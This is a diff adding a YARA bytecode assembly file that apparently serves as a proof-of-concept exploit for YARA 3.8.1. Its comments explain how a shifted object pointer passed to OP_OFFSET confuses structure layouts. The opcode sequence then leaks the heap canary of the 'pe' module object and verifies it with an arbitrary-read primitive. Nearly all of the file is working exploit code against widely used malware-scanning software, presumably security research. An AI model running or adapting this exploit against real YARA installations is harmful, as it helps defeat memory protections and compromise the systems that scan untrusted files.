@@ -1,0 +1,71 @@
+; ============= example of canary leak using OP_OFFSET =============
+;   @@@ tested on Win 10.0.17134.407, yara 3.8.1 WoW64 @@@@
+
+;   OP_OFFSET expects a YR_STRING object to be on TOS and deref's its "head" member(YR_MATCH*).
+
+;   passing a slightly shifted pointer to a `yobj`(using OP_OBJ_LOAD) causes OP_OFFSET to access that yobj's parent.
+;   Thus the result on TOS will be the addition of the canary with the pointer to the parent's name.
+
+;   By subrtracting the parent-yobj address from the result(with a small dif, accounting for heap header) I can calculate the canary's value.
+;   This is possiblee because when the object is created there are two consecutive allocations for the struct and the objects identifier.
+;   The two allocations end up one after the other.
+
+;   basically the following correlates in memory:
+;--------------------------------------------------------
+;   OBJECT_COMMON_FIELDS       |        YR_MATCH
+;______________________________|_________________________   
+; int           canary         |        int64_t base
+; int8_t        type           |
+; const char*   identifier     |        int64_t offset
+; YR_OBJECT*    parent         |
+;--------------------------------------------------------
+
+; ============= start =============
+OP_PUSH         raw     1                   ;    for OP_OFFSET primitive, to stop the search
+OP_IMPORT       ascii   "pe"                ;    add `pe` module to hashtable, this will cause the relevant allocations to happen
+
+OP_OBJ_LOAD     ascii   "pe"                ;    load address of module obj to stack
+OP_POP_M        raw     8                   ;    store for later
+OP_PUSH_M       raw     8 
+OP_OBJ_FIELD    ascii   "is_dll"            ;    will be used to read its parent's canary and identifier ('pe' module)
+OP_PUSH         raw     52
+OP_INT_SUB
+OP_OFFSET
+
+; get rid of the object type high-dword
+OP_PUSH         raw     0xFFFFFFFF
+OP_BITWISE_AND  
+
+; calculate diff from "pe" module pointer (in heap) to its module name ("pe"), also on the heap
+OP_PUSH_M       raw     8 
+OP_INT_SUB
+
+; TODO: when debugging it can be 0x30 sometimes, otherwise 0x20
+OP_PUSH         raw     0x20                ;   sizeof(heap header) + sizeof(YR_OBJECT_STRUCTURE)
+OP_INT_SUB      
+
+; reverse the addition made by OP_OFFSET
+OP_PUSH         raw     0x7FFF              ;    RAND_MAX
+OP_BITWISE_AND  
+
+
+; ============= compare canary to OP_COUNT primitive =============
+OP_PUSH_M       raw     8 
+OP_PUSH         raw     0x38                ;    offset for absolute read
+OP_INT_SUB
+OP_COUNT                                    ;    read canary to stack
+OP_PUSH         raw     0xFFFFFFFF          ;    just in case it was signed extended to 64bit
+OP_BITWISE_AND
+
+; stack should be [canary, canary]
+OP_INT_EQ
+OP_JTRUE        reloc   +1
+OP_HALT                                     ;    treat this as assert
+
+; clenaup result
+OP_POP
+
+OP_NOP
+OP_HALT
+
+
